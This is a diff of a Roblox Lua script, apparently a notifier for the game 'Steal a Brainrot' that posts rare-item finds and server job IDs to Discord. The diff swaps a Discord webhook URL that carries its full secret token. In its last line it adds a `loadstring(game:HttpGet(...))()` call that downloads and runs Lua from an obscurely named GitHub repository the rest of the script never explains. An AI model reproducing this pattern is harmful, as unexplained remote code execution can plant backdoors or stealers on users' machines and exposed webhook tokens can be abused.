@@ -84,7 +84,7 @@ sendTeleport = false,
 showJoinerAd = true
 },
 { -- Special brainrots + overpay
-url = 'https://discord.com/api/webhooks/1454624672078630982/eqhtVZ9JOeJnnxVzWyubzrceo46OfCMGhJ4zhQLRt5aZJb9E7F63U2X8s7iKd4EoK-Rp',
+url = 'https://discord.com/api/webhooks/1456411952074195051/bdZLaeKaRFCMy3HQOj50RsTq8nn1z18PBkyj_-iKfy1AZ7YK7gvst_Z-yv-lgJfKzOm3',
 title = '⭐️ SPECIAL BRAINROTS',
 color = 0xff00ff,
 special = true,
@@ -95,7 +95,11 @@ sendTeleport = true
 
 -- 📋 SPECIAL BRAINROTS WITH MIN VALUES
 local SPECIAL_BRAINROTS = {
-['Dragon Cannelloni'] = 99999999999,
+['Dragon Gingerini'] = 0,
+['Dragon Cannelloni'] = 0,
+['Strawberry Elephant'] = 0,
+['Meowl'] = 0,
+['Skibidi Toilet'] = 0,
 }
 
 -- 🎮 OBJECTS WITH EMOJIS AND IMPORTANCE
@@ -233,8 +237,7 @@ local OBJECTS = {
 ['Jolly Jolly Sahur'] = { emoji = '🥶', important = true },
 ['Los Jolly Combinasionas'] = { emoji = '🗽', important = true },
 ['Ginger Gerat'] = { emoji = '🥶', important = true },
-['Skibidi Toilet'] = { emoji = '🥶', important = true },
-['Tuff Toucan'] = { emoji = '🦜', important = true },
+['Skibidi Toilet'] = { emoji = '🥶', important = true },  
 }
 
 local ALWAYS_IMPORTANT = {}
@@ -762,4 +765,4 @@ UserInputService.InputBegan:Connect(function(input, gpe)
         copyJobIdToClipboard()
     end
 end)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Confilas/ghjnfthun/refs/heads/main/gfddfg"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dsfsdfs21cfc/yrhgnjrtyjh333/refs/heads/main/g5hg45yhhop.lua"))()
